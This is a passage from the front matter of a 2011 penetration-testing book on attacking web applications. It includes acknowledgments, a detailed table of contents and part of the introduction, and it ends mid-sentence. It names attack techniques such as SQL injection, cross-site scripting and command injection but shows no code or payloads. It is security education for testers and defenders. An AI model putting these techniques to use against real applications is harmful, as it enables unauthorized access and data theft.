articles, books, and blog postings that spawned the ideas involved. We hope 
that people whose work we discuss anonymously are content with the general 
credit given here.
We are grateful to the people at Wiley ‚Äî in particular, to Carol Long for 
enthusiastically supporting our project from the outset, to Adaobi Obi Tulton 
for helping polish our manuscript and coaching us in the quirks of ‚ÄúAmerican 
English,‚Äù to Gayle Johnson for her very helpful and attentive copy editing, and 
to Katie Wisor‚Äôs team for delivering a fi rst-rate production.
A large measure of thanks is due to our respective partners, Becky and Amanda, 
for tolerating the signifi cant distraction and time involved in producing a book 
of this size.
Both authors are indebted to the people who led us into our unusual line 
of work. Dafydd would like to thank Martin Law. Martin is a great guy who 
fi rst taught me how to hack and encouraged me to spend my time developing 
techniques and tools for attacking applications. Marcus would like to thank his 
parents for everything they have done and continue to do, including getting me 
into computers. I‚Äôve been getting into computers ever since.
ffirs.indd vii ffirs.indd vii 8/19/2011 12:22:37 PM 8/19/2011 12:22:37 PM
Stuttard ffi rs.indd V4 - 08/17/2011 Page viii
viii
Contents at a Glance
Introduction xxiii
Chapter 1 Web Application (In)security 1
Chapter 2 Core Defense Mechanisms 17
Chapter 3 Web Application Technologies 39
Chapter 4 Mapping the Application 73
Chapter 5 Bypassing Client-Side Controls 117
Chapter 6 Attacking Authentication 159
Chapter 7 Attacking Session Management 205
Chapter 8 Attacking Access Controls 257
Chapter 9 Attacking Data Stores 287
Chapter 10 Attacking Back-End Components 357
Chapter 11 Attacking Application Logic 405
Chapter 12 Attacking Users: Cross-Site Scripting 431
Chapter 13 Attacking Users: Other Techniques 501
Chapter 14 Automating Customized Attacks 571
Chapter 15 Exploiting Information Disclosure 615
Chapter 16 Attacking Native Compiled Applications 633
Chapter 17 Attacking Application Architecture 647
Chapter 18 Attacking the Application Server 669
Chapter 19 Finding Vulnerabilities in Source Code 701
Chapter 20 A Web Application Hacker‚Äôs Toolkit 747
Chapter 21 A Web Application Hacker‚Äôs Methodology 791
Index 853
ffirs.indd viii ffirs.indd viii 8/19/2011 12:22:38 PM 8/19/2011 12:22:38 PM
Stuttard ftoc.indd V2 - 08/10/2011 Page ix
ix
Introduction xxiii
Chapter 1 Web Application (In)security 1
The Evolution of Web Applications 2
Common Web Application Functions 4
Benefi ts of Web Applications 5
Web Application Security 6
‚ÄúThis Site Is Secure‚Äù 7
The Core Security Problem: Users Can Submit 
Arbitrary Input 9
Key Problem Factors 10
The New Security Perimeter 12
The Future of Web Application Security 14
Summary 15
Chapter 2 Core Defense Mechanisms 17
Handling User Access 18
Authentication 18
Session Management 19
Access Control 20
Handling User Input 21
Varieties of Input 21
Approaches to Input Handling 23
Boundary Validation 25
Multistep Validation and Canonicalization 28
Handling Attackers 30
Handling Errors 30
Maintaining Audit Logs 31
Alerting Administrators 33
Reacting to Attacks 34
Contents
ftoc.indd ix ftoc.indd ix 8/19/2011 12:23:35 PM 8/19/2011 12:23:35 PM
Stuttard ftoc.indd V2 - 08/10/2011 Page x
x Contents
Managing the Application 35
Summary 36
Questions 36
Chapter 3 Web Application Technologies 39
The HTTP Protocol 39
HTTP Requests 40
HTTP Responses 41
HTTP Methods 42
URLs 44
REST 44
HTTP Headers 45
Cookies 47
Status Codes 48
HTTPS 49
HTTP Proxies 49
HTTP Authentication 50
Web Functionality 51
Server-Side Functionality 51
Client-Side Functionality 57
State and Sessions 66
Encoding Schemes 66
URL Encoding 67
Unicode Encoding 67
HTML Encoding 68
Base64 Encoding 69
Hex Encoding 69
Remoting and Serialization 
Frameworks 70
Next Steps 70
Questions 71
Chapter 4 Mapping the Application 73
Enumerating Content and Functionality 74
Web Spidering 74
User-Directed Spidering 77
Discovering Hidden Content 80
Application Pages Versus 
Functional Paths 93
Discovering Hidden Parameters 96
Analyzing the Application 97
Identifying Entry Points for User Input 98
Identifying Server-Side Technologies 101
Identifying Server-Side Functionality 107
Mapping the Attack Surface 111
Summary 114
Questions 114
ftoc.indd x ftoc.indd x 8/19/2011 12:23:35 PM 8/19/2011 12:23:35 PM
x Stuttard ftoc.indd V2 - 08/10/2011 Page xi
 Contents xi
Chapter 5 Bypassing Client-Side Controls 117
Transmitting Data Via the Client 118
Hidden Form Fields 118
HTTP Cookies 121
URL Parameters 121
The Referer Header 122
Opaque Data 123
The ASP.NET ViewState 124
Capturing User Data: HTML Forms 127
Length Limits 128
Script-Based Validation 129
Disabled Elements 131
Capturing User Data: Browser Extensions 133
Common Browser Extension Technologies 134
Approaches to Browser Extensions 135
Intercepting Traffi c from Browser Extensions 135
Decompiling Browser Extensions 139
Attaching a Debugger 151
Native Client Components 153
Handling Client-Side Data Securely 154
Transmitting Data Via the Client 154
Validating Client-Generated Data 155
Logging and Alerting 156
Summary 156
Questions 157
Chapter 6 Attacking Authentication 159
Authentication Technologies 160
Design Flaws in Authentication 
Mechanisms 161
Bad Passwords 161
Brute-Forcible Login 162
Verbose Failure Messages 166
Vulnerable Transmission of Credentials 169
Password Change Functionality 171
Forgotten Password Functionality 173
‚ÄúRemember Me‚Äù Functionality 176
User Impersonation Functionality 178
Incomplete Validation of Credentials 180
Nonunique Usernames 181
Predictable Usernames 182
Predictable Initial Passwords 183
Insecure Distribution of Credentials 184
Implementation Flaws in Authentication 185
Fail-Open Login Mechanisms 185
Defects in Multistage Login Mechanisms 186
Insecure Storage of Credentials 190
ftoc.indd xi ftoc.indd xi 8/19/2011 12:23:35 PM 8/19/2011 12:23:35 PM
Stuttard ftoc.indd V2 - 08/10/2011 Page xii
xii Contents
Securing Authentication 191
Use Strong Credentials 192
Handle Credentials Secretively 192
Validate Credentials Properly 193
Prevent Information Leakage 195
Prevent Brute-Force Attacks 196
Prevent Misuse of the Password Change Function 199
Prevent Misuse of the Account Recovery Function 199
Log, Monitor, and Notify 201
Summary 201
Questions 202
Chapter 7 Attacking Session Management 205
The Need for State 206
Alternatives to Sessions 208
Weaknesses in Token Generation 210
Meaningful Tokens 210
Predictable Tokens 213
Encrypted Tokens 223
Weaknesses in Session Token Handling 233
Disclosure of Tokens on the Network 234
Disclosure of Tokens in Logs 237
Vulnerable Mapping of Tokens to Sessions 240
Vulnerable Session Termination 241
Client Exposure to Token Hijacking 243
Liberal Cookie Scope 244
Securing Session Management 248
Generate Strong Tokens 248
Protect Tokens Throughout Their Life Cycle 250
Log, Monitor, and Alert 253
Summary 254
Questions 255
Chapter 8 Attacking Access Controls 257
Common Vulnerabilities 258
Completely Unprotected Functionality 259
Identifi er-Based Functions 261
Multistage Functions 262
Static Files 263
Platform Misconfi guration 264
Insecure Access Control Methods 265
Attacking Access Controls 266
Testing with Different User Accounts 267
Testing Multistage Processes 271
Testing with Limited Access 273
Testing Direct Access to Methods 276
Testing Controls Over Static Resources 277
ftoc.indd xii ftoc.indd xii 8/19/2011 12:23:35 PM 8/19/2011 12:23:35 PM
xii Stuttard ftoc.indd V2 - 08/10/2011 Page xiii
 Contents xiii
Testing Restrictions on HTTP Methods 278
Securing Access Controls 278
A Multilayered Privilege Model 280
Summary 284
Questions 284
Chapter 9 Attacking Data Stores 287
Injecting into Interpreted Contexts 288
Bypassing a Login 288
Injecting into SQL 291
Exploiting a Basic Vulnerability 292
Injecting into Different Statement Types 294
Finding SQL Injection Bugs 298
Fingerprinting the Database 303
The UNION Operator 304
Extracting Useful Data 308
Extracting Data with UNION 308
Bypassing Filters 311
Second-Order SQL Injection 313
Advanced Exploitation 314
Beyond SQL Injection: Escalating the 
Database Attack 325
Using SQL Exploitation Tools 328
SQL Syntax and Error Reference 332
Preventing SQL Injection 338
Injecting into NoSQL 342
Injecting into MongoDB 343
Injecting into XPath 344
Subverting Application Logic 345
Informed XPath Injection 346
Blind XPath Injection 347
Finding XPath Injection Flaws 348
Preventing XPath Injection 349
Injecting into LDAP 349
Exploiting LDAP Injection 351
Finding LDAP Injection Flaws 353
Preventing LDAP Injection 354
Summary 354
Questions 354
Chapter 10 Attacking Back-End Components 357
Injecting OS Commands 358
Example 1: Injecting Via Perl 358
Example 2: Injecting Via ASP 360
Injecting Through Dynamic Execution 362
Finding OS Command Injection Flaws 363
Finding Dynamic Execution Vulnerabilities 366
ftoc.indd xiii ftoc.indd xiii 8/19/2011 12:23:35 PM 8/19/2011 12:23:35 PM
Stuttard ftoc.indd V2 - 08/10/2011 Page xiv
xiv Contents
Preventing OS Command Injection 367
Preventing Script Injection Vulnerabilities 368
Manipulating File Paths 368
Path Traversal Vulnerabilities 368
File Inclusion Vulnerabilities 381
Injecting into XML Interpreters 383
Injecting XML External Entities 384
Injecting into SOAP Services 386
Finding and Exploiting SOAP Injection 389
Preventing SOAP Injection 390
Injecting into Back-end HTTP Requests 390
Server-side HTTP Redirection 390
HTTP Parameter Injection 393
Injecting into Mail Services 397
E-mail Header Manipulation 398
SMTP Command Injection 399
Finding SMTP Injection Flaws 400
Preventing SMTP Injection 402
Summary 402
Questions 403
Chapter 11 Attacking Application Logic 405
The Nature of Logic Flaws 406
Real-World Logic Flaws 406
Example 1: Asking the Oracle 407
Example 2: Fooling a Password Change Function 409
Example 3: Proceeding to Checkout 410
Example 4: Rolling Your Own Insurance 412
Example 5: Breaking the Bank 414
Example 6: Beating a Business Limit 416
Example 7: Cheating on Bulk Discounts 418
Example 8: Escaping from Escaping 419
Example 9: Invalidating Input Validation 420
Example 10: Abusing a Search Function 422
Example 11: Snarfi ng Debug Messages 424
Example 12: Racing Against the Login 426
Avoiding Logic Flaws 428
Summary 429
Questions 430
Chapter 12 Attacking Users: Cross-Site Scripting 431
Varieties of XSS 433
Refl ected XSS Vulnerabilities 434
Stored XSS Vulnerabilities 438
DOM-Based XSS Vulnerabilities 440
XSS Attacks in Action 442
Real-World XSS Attacks 442
ftoc.indd xiv ftoc.indd xiv 8/19/2011 12:23:35 PM 8/19/2011 12:23:35 PM
iv Stuttard ftoc.indd V2 - 08/10/2011 Page xv
 Contents xv
Payloads for XSS Attacks 443
Delivery Mechanisms for XSS Attacks 447
Finding and Exploiting XSS Vulnerabilities 451
Finding and Exploiting Refl ected XSS Vulnerabilities 452
Finding and Exploiting Stored XSS Vulnerabilities 481
Finding and Exploiting DOM-Based XSS Vulnerabilities 487
Preventing XSS Attacks 492
Preventing Refl ected and Stored XSS 492
Preventing DOM-Based XSS 496
Summary 498
Questions 498
Chapter 13 Attacking Users: Other Techniques 501
Inducing User Actions 501
Request Forgery 502
UI Redress 511
Capturing Data Cross-Domain 515
Capturing Data by Injecting HTML 516
Capturing Data by Injecting CSS 517
JavaScript Hijacking 519
The Same-Origin Policy Revisited 524
The Same-Origin Policy and Browser Extensions 525
The Same-Origin Policy and HTML5 528
Crossing Domains with Proxy Service Applications 529
Other Client-Side Injection Attacks 531
HTTP Header Injection 531
Cookie Injection 536
Open Redirection Vulnerabilities 540
Client-Side SQL Injection 547
Client-Side HTTP Parameter Pollution 548
Local Privacy Attacks 550
Persistent Cookies 550
Cached Web Content 551
Browsing History 552
Autocomplete 552
Flash Local Shared Objects 553
Silverlight Isolated Storage 553
Internet Explorer userData 554
HTML5 Local Storage Mechanisms 554
Preventing Local Privacy Attacks 554
Attacking ActiveX Controls 555
Finding ActiveX Vulnerabilities 556
Preventing ActiveX Vulnerabilities 558
Attacking the Browser 559
Logging Keystrokes 560
Stealing Browser History and Search Queries 560
ftoc.indd xv ftoc.indd xv 8/19/2011 12:23:35 PM 8/19/2011 12:23:35 PM
Stuttard ftoc.indd V2 - 08/10/2011 Page xvi
xvi Contents
Enumerating Currently Used Applications 560
Port Scanning 561
Attacking Other Network Hosts 561
Exploiting Non-HTTP Services 562
Exploiting Browser Bugs 563
DNS Rebinding 563
Browser Exploitation Frameworks 564
Man-in-the-Middle Attacks 566
Summary 568
Questions 568
Chapter 14 Automating Customized Attacks 571
Uses for Customized Automation 572
Enumerating Valid Identifi ers 573
The Basic Approach 574
Detecting Hits 574
Scripting the Attack 576
JAttack 577
Harvesting Useful Data 583
Fuzzing for Common Vulnerabilities 586
Putting It All Together: Burp Intruder 590
Barriers to Automation 602
Session-Handling Mechanisms 602
CAPTCHA Controls 610
Summary 613
Questions 613
Chapter 15 Exploiting Information Disclosure 615
Exploiting Error Messages 615
Script Error Messages 616
Stack Traces 617
Informative Debug Messages 618
Server and Database Messages 619
Using Public Information 623
Engineering Informative Error Messages 624
Gathering Published Information 625
Using Inference 626
Preventing Information Leakage 627
Use Generic Error Messages 628
Protect Sensitive Information 628
Minimize Client-Side Information Leakage 629
Summary 629
Questions 630
Chapter 16 Attacking Native Compiled Applications 633
Buffer Overfl ow Vulnerabilities 634
Stack Overfl ows 634
Heap Overfl ows 635
ftoc.indd xvi ftoc.indd xvi 8/19/2011 12:23:35 PM 8/19/2011 12:23:35 PM
vi Stuttard ftoc.indd V2 - 08/10/2011 Page xvii
 Contents xvii
‚ÄúOff-by-One‚Äù Vulnerabilities 636
Detecting Buffer Overfl ow Vulnerabilities 639
Integer Vulnerabilities 640
Integer Overfl ows 640
Signedness Errors 641
Detecting Integer Vulnerabilities 642
Format String Vulnerabilities 643
Detecting Format String Vulnerabilities 644
Summary 645
Questions 645
Chapter 17 Attacking Application Architecture 647
Tiered Architectures 647
Attacking Tiered Architectures 648
Securing Tiered Architectures 654
Shared Hosting and Application Service Providers 656
Virtual Hosting 657
Shared Application Services 657
Attacking Shared Environments 658
Securing Shared Environments 665
Summary 667
Questions 667
Chapter 18 Attacking the Application Server 669
Vulnerable Server Confi guration 670
Default Credentials 670
Default Content 671
Directory Listings 677
WebDAV Methods 679
The Application Server as a Proxy 682
Misconfi gured Virtual Hosting 683
Securing Web Server Confi guration 684
Vulnerable Server Software 684
Application Framework Flaws 685
Memory Management Vulnerabilities 687
Encoding and Canonicalization 689
Finding Web Server Flaws 694
Securing Web Server Software 695
Web Application Firewalls 697
Summary 699
Questions 699
Chapter 19 Finding Vulnerabilities in Source Code 701
Approaches to Code Review 702
Black-Box Versus White-Box Testing 702
Code Review Methodology 703
Signatures of Common Vulnerabilities 704
Cross-Site Scripting 704
ftoc.indd xvii ftoc.indd xvii 8/19/2011 12:23:35 PM 8/19/2011 12:23:35 PM
Stuttard ftoc.indd V2 - 08/10/2011 Page xviii
xviii Contents
SQL Injection 705
Path Traversal 706
Arbitrary Redirection 707
OS Command Injection 708
Backdoor Passwords 708
Native Software Bugs 709
Source Code Comments 710
The Java Platform 711
Identifying User-Supplied Data 711
Session Interaction 712
Potentially Dangerous APIs 713
Confi guring the Java Environment 716
ASP.NET 718
Identifying User-Supplied Data 718
Session Interaction 719
Potentially Dangerous APIs 720
Confi guring the ASP.NET Environment 723
PHP 724
Identifying User-Supplied Data 724
Session Interaction 727
Potentially Dangerous APIs 727
Confi guring the PHP Environment 732
Perl 735
Identifying User-Supplied Data 735
Session Interaction 736
Potentially Dangerous APIs 736
Confi guring the Perl Environment 739
JavaScript 740
Database Code Components 741
SQL Injection 741
Calls to Dangerous Functions 742
Tools for Code Browsing 743
Summary 744
Questions 744
Chapter 20 A Web Application Hacker‚Äôs Toolkit 747
Web Browsers 748
Internet Explorer 748
Firefox 749
Chrome 750
Integrated Testing Suites 751
How the Tools Work 751
Testing Work Flow 769
Alternatives to the Intercepting Proxy 771
Standalone Vulnerability Scanners 773
Vulnerabilities Detected by Scanners 774
Inherent Limitations of Scanners 776
ftoc.indd xviii ftoc.indd xviii 8/19/2011 12:23:35 PM 8/19/2011 12:23:35 PM
iii Stuttard ftoc.indd V2 - 08/10/2011 Page xix
 Contents xix
Technical Challenges Faced by Scanners 778
Current Products 781
Using a Vulnerability Scanner 783
Other Tools 785
Wikto/Nikto 785
Firebug 785
Hydra 785
Custom Scripts 786
Summary 789
Chapter 21 A Web Application Hacker‚Äôs Methodology 791
General Guidelines 793
1 Map the Application‚Äôs Content 795
1.1 Explore Visible Content 795
1.2 Consult Public Resources 796
1.3 Discover Hidden Content 796
1.4 Discover Default Content 797
1.5 Enumerate Identifi er-Specifi ed Functions 797
1.6 Test for Debug Parameters 798
2 Analyze the Application 798
2.1 Identify Functionality 798
2.2 Identify Data Entry Points 799
2.3 Identify the Technologies Used 799
2.4 Map the Attack Surface 800
3 Test Client-Side Controls 800
3.1 Test Transmission of Data Via the Client 801
3.2 Test Client-Side Controls Over User Input 801
3.3 Test Browser Extension Components 802
4 Test the Authentication Mechanism 805
4.1 Understand the Mechanism 805
4.2 Test Password Quality 806
4.3 Test for Username Enumeration 806
4.4 Test Resilience to Password Guessing 807
4.5 Test Any Account Recovery Function 807
4.6 Test Any Remember Me Function 808
4.7 Test Any Impersonation Function 808
4.8 Test Username Uniqueness 809
4.9 Test Predictability of Autogenerated Credentials 809
4.10 Check for Unsafe Transmission of Credentials 810
4.11 Check for Unsafe Distribution of Credentials 810
4.12 Test for Insecure Storage 811
4.13 Test for Logic Flaws 811
4.14 Exploit Any Vulnerabilities to Gain Unauthorized Access 813
5 Test the Session Management Mechanism 814
5.1 Understand the Mechanism 814
5.2 Test Tokens for Meaning 815
5.3 Test Tokens for Predictability 816
ftoc.indd xix ftoc.indd xix 8/19/2011 12:23:35 PM 8/19/2011 12:23:35 PM
Stuttard ftoc.indd V2 - 08/10/2011 Page xx
xx Contents
5.4 Check for Insecure Transmission of Tokens 817
5.5 Check for Disclosure of Tokens in Logs 817
5.6 Check Mapping of Tokens to Sessions 818
5.7 Test Session Termination 818
5.8 Check for Session Fixation 819
5.9 Check for CSRF 820
5.10 Check Cookie Scope 820
6 Test Access Controls 821
6.1 Understand the Access Control Requirements 821
6.2 Test with Multiple Accounts 822
6.3 Test with Limited Access 822
6.4 Test for Insecure Access Control Methods 823
7 Test for Input-Based Vulnerabilities 824
7.1 Fuzz All Request Parameters 824
7.2 Test for SQL Injection 827
7.3 Test for XSS and Other Response Injection 829
7.4 Test for OS Command Injection 832
7.5 Test for Path Traversal 833
7.6 Test for Script Injection 835
7.7 Test for File Inclusion 835
8 Test for Function-Specifi c Input Vulnerabilities 836
8.1 Test for SMTP Injection 836
8.2 Test for Native Software Vulnerabilities 837
8.3 Test for SOAP Injection 839
8.4 Test for LDAP Injection 839
8.5 Test for XPath Injection 840
8.6 Test for Back-End Request Injection 841
8.7 Test for XXE Injection 841
9 Test for Logic Flaws 842
9.1 Identify the Key Attack Surface 842
9.2 Test Multistage Processes 842
9.3 Test Handling of Incomplete Input 843
9.4 Test Trust Boundaries 844
9.5 Test Transaction Logic 844
10 Test for Shared Hosting Vulnerabilities 845
10.1 Test Segregation in Shared Infrastructures 845
10.2 Test Segregation Between ASP-Hosted Applications 845
11 Test for Application Server Vulnerabilities 846
11.1 Test for Default Credentials 846
11.2 Test for Default Content 847
11.3 Test for Dangerous HTTP Methods 847
11.4 Test for Proxy Functionality 847
11.5 Test for Virtual Hosting Misconfi guration 847
11.6 Test for Web Server Software Bugs 848
11.7 Test for Web Application Firewalling 848
ftoc.indd xx ftoc.indd xx 8/19/2011 12:23:36 PM 8/19/2011 12:23:36 PM
xx Stuttard ftoc.indd V2 - 08/10/2011 Page xxi
 Contents xxi
12 Miscellaneous Checks 849
12.1 Check for DOM-Based Attacks 849
12.2 Check for Local Privacy Vulnerabilities 850
12.3 Check for Weak SSL Ciphers 851
12.4 Check Same-Origin Policy Confi guration 851
13 Follow Up Any Information Leakage 852
Index 853
ftoc.indd xxi ftoc.indd xxi 8/19/2011 12:23:36 PM 8/19/2011 12:23:36 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxii
flast.indd xxii flast.indd xxii 8/19/2011 12:23:07 PM 8/19/2011 12:23:07 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxiii
xxiii
Introduction
This book is a practical guide to discovering and exploiting security fl aws in 
web applications. By ‚Äúweb applications‚Äù we mean those that are accessed using 
a web browser to communicate with a web server. We examine a wide variety 
of different technologies, such as databases, fi le systems, and web services, but 
only in the context in which these are employed by web applications.
If you want to learn how to run port scans, attack fi rewalls, or break into servers in other ways, we suggest you look elsewhere. But if you want to know how 
to hack into a web application, steal sensitive data, and perform unauthorized 
actions, this is the book for you. There is enough that is interesting and fun to 
say on that subject without straying into any other territory.
Overview of This Book
The focus of this book is highly practical. Although we include suffi cient background and theory for you to understand the vulnerabilities that web applications 
contain, our primary concern is the tasks and techniques that you need to master 
to break into them. Throughout the book, we spell out the specifi c steps you need 
to follow to detect each type of vulnerability, and how to exploit it to perform 
unauthorized actions. We also include a wealth of real-world examples, derived 
from the authors‚Äô many years of experience, illustrating how different kinds of 
security fl aws manifest themselves in today‚Äôs web applications.
Security awareness is usually a double-edged sword. Just as application 
developers can benefi t from understanding the methods attackers use, hackers 
can gain from knowing how applications can effectively defend themselves. 
In addition to describing security vulnerabilities and attack techniques, we 
describe in detail the countermeasures that applications can take to thwart an 
flast.indd xxiii flast.indd xxiii 8/19/2011 12:23:07 PM 8/19/2011 12:23:07 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxiv
xxiv Introduction
attacker. If you perform penetration tests of web applications, this will enable 
you to provide high-quality remediation advice to the owners of the applications you compromise.
Who Should Read This Book
This book‚Äôs primary audience is anyone who has a personal or professional 
interest in attacking web applications. It is also aimed at anyone responsible for 
developing and administering web applications. Knowing how your enemies 
operate will help you defend against them.
We assume that you are familiar with core security concepts such as logins 
and access controls and that you have a basic grasp of core web technologies 
such as browsers, web servers, and HTTP. However, any gaps in your current 
knowledge of these areas will be easy to remedy, through either the explanations contained in this book or references elsewhere.
In the course of illustrating many categories of security fl aws, we provide 
code extracts showing how applications can be vulnerable. These examples are 
simple enough that you can understand them without any prior knowledge 
of the language in question. But they are most useful if you have some basic 
experience with reading or writing code.
How This Book Is Organized
This book is organized roughly in line with the dependencies between the different topics covered. If you are new to web application hacking, you should read 
the book from start to fi nish, acquiring the knowledge and understanding you 
need to tackle later chapters. If you already have some experience in this area, 
you can jump straight into any chapter or subsection that particularly interests you. 
Where necessary, we have included cross-references to other chapters, which 
you can use to fi ll in any gaps in your understanding.
We begin with three context-setting chapters describing the current state of 
web application security and the trends that indicate how it is likely to evolve 
in the near future. We examine the core security problem affecting web applications and the defense mechanisms that applications implement to address 
this problem. We also provide a primer on the key technologies used in today‚Äôs 
web applications.
The bulk of the book is concerned with our core topic ‚Äî the techniques 
you can use to break into web applications. This material is organized around 
the key tasks you need to perform to carry out a comprehensive attack. These 
include mapping the application‚Äôs functionality, scrutinizing and attacking its 
core defense mechanisms, and probing for specifi c categories of security fl aws.
flast.indd xxiv flast.indd xxiv 8/19/2011 12:23:07 PM 8/19/2011 12:23:07 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxv
 Introduction xxv
The book concludes with three chapters that pull together the various strands 
introduced in the book. We describe the process of fi nding vulnerabilities in 
an application‚Äôs source code, review the tools that can help when you hack web 
applications, and present a detailed methodology for performing a comprehensive and deep attack against a specifi c target.
Chapter 1, ‚ÄúWeb Application (In)security,‚Äù describes the current state of security in web applications on the Internet today. Despite common assurances, the 
majority of applications are insecure and can be compromised in some way with 
a modest degree of skill. Vulnerabilities in web applications arise because of a 
single core problem: users can submit arbitrary input. This chapter examines the 
key factors that contribute to the weak security posture of today‚Äôs applications. 
It also describes how defects in web applications can leave an organization‚Äôs 
wider technical infrastructure highly vulnerable to attack.
Chapter 2, ‚ÄúCore Defense Mechanisms,‚Äù describes the key security mechanisms 
that web applications employ to address the fundamental problem that all user 
input is untrusted. These mechanisms are the means by which an application 
manages user access, handles user input, and responds to attackers. These 
mechanisms also include the functions provided for administrators to manage 
and monitor the application itself. The application‚Äôs core security mechanisms 
also represent its primary attack surface, so you need to understand how these 
mechanisms are intended to function before you can effectively attack them.
Chapter 3, ‚ÄúWeb Application Technologies,‚Äù is a short primer on the key 
technologies you are likely to encounter when attacking web applications. It 
covers all relevant aspects of the HTTP protocol, the technologies commonly 
used on the client and server sides, and various schemes used to encode data. If 
you are already familiar with the main web technologies, you can skim through 
this chapter.
Chapter 4, ‚ÄúMapping the Application,‚Äù describes the fi rst exercise you need 
to perform when targeting a new application ‚Äî gathering as much information 
as possible to map its attack surface and formulate your plan of attack. This 
process includes exploring and probing the application to catalog all its content 
and functionality, identifying all the entry points for user input, and discovering the technologies in use.
Chapter 5, ‚ÄúBypassing Client-Side Controls,‚Äù covers the fi rst area of actual 
vulnerability, which arises when an application relies on controls implemented 
on the client side for its security. This approach normally is fl awed, because 
any client-side controls can, of course, be circumvented. The two main ways 
in which applications make themselves vulnerable are by transmitting data 
via the client on the assumption that it will not be modifi ed, and by relying on 
client-side checks on user input. This chapter describes a range of interesting 
technologies, including lightweight controls implemented within HTML, HTTP, 
and JavaScript, and more heavyweight controls using Java applets, ActiveX 
controls, Silverlight, and Flash objects.
flast.indd xxv flast.indd xxv 8/19/2011 12:23:08 PM 8/19/2011 12:23:08 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxvi
xxvi Introduction
Chapters 6, 7, and 8 cover some of the most important defense mechanisms 
implemented within web applications: those responsible for controlling user 
access. Chapter 6, ‚ÄúAttacking Authentication,‚Äù examines the various functions by 
which applications gain assurance of their users‚Äô identity. This includes the main 
login function and also the more peripheral authentication-related functions such 
as user registration, password changing, and account recovery. Authentication 
mechanisms contain a wealth of different vulnerabilities, in both design and 
implementation, which an attacker can leverage to gain unauthorized access. 
These range from obvious defects, such as bad passwords and susceptibility to 
brute-force attacks, to more obscure problems within the authentication logic. 
We also examine in detail the types of multistage login mechanisms used in 
many security-critical applications and describe the new kinds of vulnerabilities 
these frequently contain.
Chapter 7, ‚ÄúAttacking Session Management,‚Äù examines the mechanism by which 
most applications supplement the stateless HTTP protocol with the concept of 
a stateful session, enabling them to uniquely identify each user across several 
different requests. This mechanism is a key target when you are attacking a 
web application, because if you can break it, you can effectively bypass the login 
and masquerade as other users without knowing their credentials. We look at 
various common defects in the generation and transmission of session tokens 
and describe the steps you can take to discover and exploit these.
Chapter 8, ‚ÄúAttacking Access Controls,‚Äù looks at the ways in which applications actually enforce access controls, relying on authentication and session 
management mechanisms to do so. We describe various ways in which access 
controls can be broken and how you can detect and exploit these weaknesses.
Chapters 9 and 10 cover a large category of related vulnerabilities, which 
arise when applications embed user input into interpreted code in an unsafe 
way. Chapter 9, ‚ÄúAttacking Data Stores,‚Äù begins with a detailed examination of 
SQL injection vulnerabilities. It covers the full range of attacks, from the most 
obvious and trivial to advanced exploitation techniques involving out-of-band 
channels, inference, and time delays. For each kind of vulnerability and attack 
technique, we describe the relevant differences between three common types 
of databases: MS-SQL, Oracle, and MySQL. We then look at a range of similar 
attacks that arise against other data stores, including NoSQL, XPath, and LDAP.
Chapter 10, ‚ÄúAttacking Back-End Components,‚Äù describes several other categories of injection vulnerabilities, including the injection of operating system 
commands, injection into web scripting languages, fi le path traversal attacks, 
fi le inclusion vulnerabilities, injection into XML, SOAP, back-end HTTP requests, 
and e-mail services.
Chapter 11, ‚ÄúAttacking Application Logic,‚Äù examines a signifi cant, and frequently overlooked, area of every application‚Äôs attack surface: the internal logic 
it employs to implement its functionality. Defects in an application‚Äôs logic are 
extremely varied and are harder to characterize than common vulnerabilities 
flast.indd xxvi flast.indd xxvi 8/19/2011 12:23:08 PM 8/19/2011 12:23:08 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxvii
 Introduction xxvii
such as SQL injection and cross-site scripting. For this reason, we present a 
series of real-world examples in which defective logic has left an application 
vulnerable. These illustrate the variety of faulty assumptions that application 
designers and developers make. From these different individual fl aws, we derive 
a series of specifi c tests that you can perform to locate many types of logic fl aws 
that often go undetected.
Chapters 12 and 13 cover a large and very topical area of related vulnerabilities that arise when defects within a web application can enable a malicious 
user of the application to attack other users and compromise them in various ways. Chapter 12, ‚ÄúAttacking Users: Cross-Site Scripting,‚Äù, examines the 
most prominent vulnerability of this kind ‚Äî a hugely prevalent fl aw affecting 
the vast majority of web applications on the Internet. We examine in detail all the 
different fl avors of XSS vulnerabilities and describe an effective methodology 
for detecting and exploiting even the most obscure manifestations of these.
Chapter 13, ‚ÄúAttacking Users: Other Techniques,‚Äù looks at several other types 
of attacks against other users, including inducing user actions through request 
forgery and UI redress, capturing data cross-domain using various client-side 
technologies, various attacks against the same-origin policy, HTTP header 
injection, cookie injection and session fi xation, open redirection, client-side SQL 
injection, local privacy attacks, and exploiting bugs in ActiveX controls. The 
chapter concludes with a discussion of a range of attacks against users that do 
not depend on vulnerabilities in any particular web application, but that can be 
delivered via any malicious web site or suitably positioned attacker.
Chapter 14, ‚ÄúAutomating Customized Attacks,‚Äù does not introduce any new 
categories of vulnerabilities. Instead, it describes a crucial technique you need 
to master to attack web applications effectively. Because every web application 
is different, most attacks are customized in some way, tailored to the application‚Äôs specifi c behavior and the ways you have discovered to manipulate it to 
your advantage. They also frequently require issuing a large number of similar 
requests and monitoring the application‚Äôs responses. Performing these requests 
manually is extremely laborious and prone to mistakes. To become a truly 
accomplished web application hacker, you need to automate as much of this 
work as possible to make your customized attacks easier, faster, and more effective. This chapter describes in detail a proven methodology for achieving this. 
We also examine various common barriers to the use of automation, including 
defensive session-handling mechanisms and CAPTCHA controls. Furthermore, 
we describe tools and techniques you can use to overcome these barriers.
Chapter 15, ‚ÄúExploiting Information Disclosure,‚Äù examines various ways in 
which applications leak information when under active attack. When you are 
performing all the other types of attacks described in this book, you should 
always monitor the application to identify further sources of information disclosure that you can exploit. We describe how you can investigate anomalous 
behavior and error messages to gain a deeper understanding of the application‚Äôs 
flast.indd xxvii flast.indd xxvii 8/19/2011 12:23:08 PM 8/19/2011 12:23:08 PM
Stuttard fl ast.indd V2 - 08/10/2011 Page xxviii
xxviii Introduction
internal workings and fi ne-tune your attack. We also cover ways to manipulate 
defective error handling to systematically retrieve sensitive information from 
the application.
Chapter 16, ‚ÄúAttacking Native Compiled Applications,‚Äù looks at a set of important vulnerabilities that arise in applications written in native code languages 
such as C and C++. These vulnerabilities include buffer overfl ows, integer vulnerabilities, and format string fl aws. Because this is a potentially huge topic, 
